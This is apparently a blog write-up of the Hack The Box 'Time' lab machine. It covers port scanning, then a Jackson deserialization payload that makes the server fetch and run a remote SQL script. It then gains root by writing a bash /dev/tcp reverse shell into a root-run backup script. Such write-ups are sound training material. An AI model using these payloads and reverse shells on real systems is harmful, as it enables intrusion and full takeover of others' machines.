@@ -1,0 +1,125 @@
+<p><em><strong>Jan 06, 2021</strong></em></p>
+
+<p><a href="https://www.hackthebox.eu/home/machines/profile/286">Time</a> Writeup</p>
+
+<h2 id="recon-">Recon :</h2>
+
+<p>First i scanned for open ports using my <a href="https://github.com/bvr0n/PortScanner/">Tool</a>, Then i scanned those ports with <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvr0n@kali:~/ctf/htb/Time<span class="nv">$ </span>portscanner <span class="nt">-u</span> 10.10.10.214
+ ____            _     ____                                  
+|  _ <span class="se">\ </span>___  _ __| |_  / ___|  ___ __ _ _ __  _ __   ___ _ __ 
+| |_<span class="o">)</span> / _ <span class="se">\|</span> <span class="s1">'__| __| \___ \ / __/ _` | '</span>_ <span class="se">\|</span> <span class="s1">'_ \ / _ \ '</span>__|
+|  __/ <span class="o">(</span>_<span class="o">)</span> | |  | |_   ___<span class="o">)</span> | <span class="o">(</span>_| <span class="o">(</span>_| | | | | | | |  __/ |   
+|_|   <span class="se">\_</span>__/|_|   <span class="se">\_</span>_| |____/ <span class="se">\_</span>__<span class="se">\_</span>_,_|_| |_|_| |_|<span class="se">\_</span>__|_|   
+                                                             
+
+                   by @Taha El Ghadraoui
+                      @bvr0n 
+
+<span class="nt">--------------------------------------------------</span>
+Scanning Target: 10.10.10.214
+Scanning started at:2021-01-05 04:01:16.318087
+<span class="nt">--------------------------------------------------</span>
+
+
+<span class="o">[</span>+] Scanning All 65 535 TCP Ports.. 
+
+<span class="o">[</span>+] Port : 22 is open
+<span class="o">[</span>+] Port : 80 is open
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvr0n@kali:~/ctf/htb/Time<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.214 <span class="nt">-p</span> 22,80
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-05 04:02 EST
+Nmap scan report <span class="k">for </span>10.10.10.214
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Online JSON parser
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>So we have <code class="language-plaintext highlighter-rouge">ssh</code> &amp; <code class="language-plaintext highlighter-rouge">http</code> running, <code class="language-plaintext highlighter-rouge">ssh</code> won’t get you anywhere so let’s see the web page.
+After looking inside, it’s running a <code class="language-plaintext highlighter-rouge">JSON Parser</code>, i tried some basic stuff in that form but nothing really came up, except this weird <code class="language-plaintext highlighter-rouge">ERROR</code> :</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Validation</span> <span class="nl">failed:</span> <span class="nc">Unhandled</span> <span class="nc">Java</span> <span class="nl">exception:</span> <span class="n">com</span><span class="o">.</span><span class="na">fasterxml</span><span class="o">.</span><span class="na">jackson</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">JsonParseException</span><span class="o">:</span> <span class="nc">Unrecognized</span> <span class="n">token</span> <span class="sc">'a'</span><span class="o">:</span> <span class="n">was</span> <span class="nf">expecting</span> <span class="o">(</span><span class="err">'</span><span class="kc">true</span><span class="err">'</span><span class="o">,</span> <span class="err">'</span><span class="kc">false</span><span class="err">'</span> <span class="n">or</span> <span class="err">'</span><span class="kc">null</span><span class="err">'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>So i looked for it in google and i stubmled acorss this <a href="https://github.com/jas502n/CVE-2019-12384">Article</a> explaining it very precisely.</p>
+
+<p>I used this payload from that article :</p>
+
+<h4 id="steps-">Steps :</h4>
+
+<p>1) add a reverse shell inside <code class="language-plaintext highlighter-rouge">inject.sql</code> 
+2) Run a python http server inside the repo where <code class="language-plaintext highlighter-rouge">inject.sql</code> is located.
+3) start a netcat listner.
+4) run the payload inside the <code class="language-plaintext highlighter-rouge">Json Parser</code>.</p>
+
+<h5 id="payload-">Payload :</h5>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="s">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span><span class="o">,</span> <span class="o">{</span><span class="s">"url"</span><span class="o">:</span><span class="s">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://[MYIP]:8000/inject.sql'"</span><span class="o">}]</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvr0n@kali:~/ctf/htb/Time<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.214 - - <span class="o">[</span>05/Jan/2021 15:36:39] <span class="s2">"GET /inject.sql HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvr0n@kali:~<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span><span class="c">#######] from (UNKNOWN) [10.10.10.214] 52132</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>844<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+pericles@time:/var/www/html<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
+pericles@time:/var/www/html<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-">Privilege Escalation :</h2>
+
+<p>After running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> i saw something weird, a file named <code class="language-plaintext highlighter-rouge">timer_backup.sh</code> :</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Analyzing .timer files
+<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+/usr/bin/timer_backup.sh
+</code></pre></div></div>
+<p>Don’t bother understanding what’s inside, it ziped <code class="language-plaintext highlighter-rouge">/var/www/html</code> into <code class="language-plaintext highlighter-rouge">website.bak.zip</code> &amp; move it to <code class="language-plaintext highlighter-rouge">/root/backup.zip</code>, This looks like a cron.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/timer_backup.sh
+<span class="c">#!/bin/bash</span>
+zip <span class="nt">-r</span> website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> <span class="nb">mv </span>website.bak.zip /root/backup.zip
+</code></pre></div></div>
+<p>I tried testing if this would execute something in my side, and it did, but this methode gave me an empty <code class="language-plaintext highlighter-rouge">root.txt</code> -_- :</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/home/pericles<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"mv /root/root.txt &gt; /home/pericles/root.txt"</span> <span class="o">&gt;</span> /usr/bin/timer_backup.sh
+pericles@time:/home/pericles<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/timer_backup.sh 
+<span class="nb">mv</span> /root/root.txt <span class="o">&gt;</span> /home/pericles/root.txt
+pericles@time:/home/pericles<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/home/pericles<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+<span class="nt">-rw-r--r--</span> 1 root     root        0 Jan  6 19:31 root.txt
+drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
+<span class="nt">-r--------</span> 1 pericles pericles   33 Jan  6 05:45 user.txt
+</code></pre></div></div>
+<p>So i tried a reverse shell inside and it worked, the shell die in few seconds but enough to grabbe the flag :</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pericles@time:/home/pericles<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/[IP]/8080 0&gt;&amp;1"</span> <span class="o">&gt;</span> /usr/bin/timer_backup.sh 
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvr0n@kali:~<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 8080
+listening on <span class="o">[</span>any] 8080 ...
+connect to <span class="o">[</span><span class="c">######] from (UNKNOWN) [10.10.10.214] 41774</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>262995<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@time:/# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
+id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">time</span>
+</code></pre></div></div>
+
+<p>And we are <code class="language-plaintext highlighter-rouge">root</code>, hope you enjoy this writeups.</p>
